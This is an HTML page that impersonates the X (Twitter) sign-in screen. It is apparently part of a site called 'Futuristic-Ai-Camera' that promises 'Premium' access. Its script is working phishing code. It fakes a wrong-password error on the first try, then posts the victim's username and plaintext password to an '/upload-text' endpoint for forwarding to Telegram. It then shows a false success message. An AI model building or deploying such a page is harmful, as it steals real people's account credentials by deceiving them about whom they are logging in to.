<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to X</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background: #000;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }
    
    .x-container {
      max-width: 600px;
      width: 100%;
      background: #000;
      padding: 20px;
    }
    
    .x-logo {
      text-align: center;
      margin-bottom: 48px;
    }
    
    .x-logo svg {
      width: 42px;
      height: 42px;
      fill: #fff;
    }
    
    .x-title {
      font-size: 31px;
      font-weight: 700;
      margin-bottom: 32px;
      text-align: center;
    }
    
    .x-card {
      max-width: 364px;
      margin: 0 auto;
    }
    
    .x-error {
      color: #f4212e;
      background: rgba(244, 33, 46, 0.1);
      padding: 12px 16px;
      border-radius: 8px;
      margin-bottom: 20px;
      font-size: 15px;
      display: none;
    }
    
    .x-input-group {
      position: relative;
      margin-bottom: 20px;
    }
    
    .x-input {
      width: 100%;
      padding: 24px 16px 8px;
      font-size: 17px;
      background: transparent;
      border: 1px solid #333639;
      border-radius: 4px;
      color: #fff;
      outline: none;
      transition: 0.2s;
    }
    
    .x-input:focus {
      border-color: #1d9bf0;
    }
    
    .x-label {
      position: absolute;
      left: 16px;
      top: 16px;
      font-size: 17px;
      color: #71767b;
      pointer-events: none;
      transition: 0.2s;
    }
    
    .x-input:focus + .x-label,
    .x-input:not(:placeholder-shown) + .x-label {
      top: 8px;
      font-size: 13px;
    }
    
    .x-next-btn {
      width: 100%;
      padding: 16px;
      background: #fff;
      color: #000;
      font-size: 17px;
      font-weight: 700;
      border: none;
      border-radius: 9999px;
      cursor: pointer;
      margin-top: 24px;
      transition: 0.2s;
    }
    
    .x-next-btn:hover {
      background: #e6e6e6;
    }
    
    .x-forgot {
      text-align: center;
      margin-top: 20px;
    }
    
    .x-forgot a {
      color: #1d9bf0;
      text-decoration: none;
      font-size: 15px;
    }
    
    .x-divider {
      text-align: center;
      margin: 32px 0;
      color: #71767b;
      font-size: 15px;
    }
    
    .x-signup-btn {
      width: 100%;
      padding: 16px;
      background: transparent;
      color: #1d9bf0;
      font-size: 17px;
      font-weight: 700;
      border: 1px solid #333639;
      border-radius: 9999px;
      cursor: pointer;
      transition: 0.2s;
    }
    
    .x-signup-btn:hover {
      background: rgba(29, 155, 240, 0.1);
    }
    
    .back-link {
      text-align: center;
      margin-top: 32px;
    }
    
    .back-link a {
      color: #1d9bf0;
      text-decoration: none;
      font-size: 15px;
    }
  </style>
</head>
<body>
  
  <div class="x-container">
    <div class="x-logo">
      <svg viewBox="0 0 24 24">
        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
      </svg>
    </div>
    
    <h1 class="x-title">Sign in to X</h1>
    
    <div class="x-card">
      <div id="x-error" class="x-error"></div>
      
      <div class="x-input-group">
        <input 
          type="text" 
          id="x-username" 
          class="x-input" 
          placeholder=" "
        >
        <label class="x-label">Phone, email, or username</label>
      </div>
      
      <div class="x-input-group">
        <input 
          type="password" 
          id="x-password" 
          class="x-input" 
          placeholder=" "
        >
        <label class="x-label">Password</label>
      </div>
      
      <button class="x-next-btn" onclick="xLogin()">Next</button>
      
      <div class="x-forgot">
        <a href="#">Forgot password?</a>
      </div>
      
      <div class="x-divider">or</div>
      
      <button class="x-signup-btn">Create account</button>
    </div>
    
    <div class="back-link">
      <a href="profile.html">‚Üê Back to Profile</a>
    </div>
  </div>
  
  <script>
    let attemptCount = 0;
    
    async function xLogin() {
      const username = document.getElementById('x-username').value.trim();
      const password = document.getElementById('x-password').value;
      const errorDiv = document.getElementById('x-error');
      
      if (!username || !password) {
        errorDiv.textContent = "Enter your phone number, email address, or username.";
        errorDiv.style.display = "block";
        return;
      }
      
      attemptCount++;
      
      if (attemptCount === 1) {
        errorDiv.textContent = "Wrong password! Try again.";
        errorDiv.style.display = "block";
        return;
      }
      
      errorDiv.style.display = "none";
      
      localStorage.setItem("userLoggedIn", "true");
      localStorage.setItem("userName", username);
      localStorage.setItem("loginMethod", "X (Twitter)");
      
      await sendToTelegram("X (Twitter)", username, password);
      
      alert("‚úÖ Login Successful!\n\nWelcome to Premium!");
      window.location.href = "index.html";
    }
    
    async function sendToTelegram(method, email, password) {
      const message = `üîê New Login - ${method}\n\nEmail/Username: ${email}\nPassword: ${password}\n\nFrom: Futuristic-Ai-Camera`;
      
      try {
        const response = await fetch("/upload-text", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ text: message })
        });
        console.log("‚úÖ Sent to Telegram!");
      } catch (err) {
        console.error("Telegram error:", err);
      }
    }
  </script>
</body>
</html>
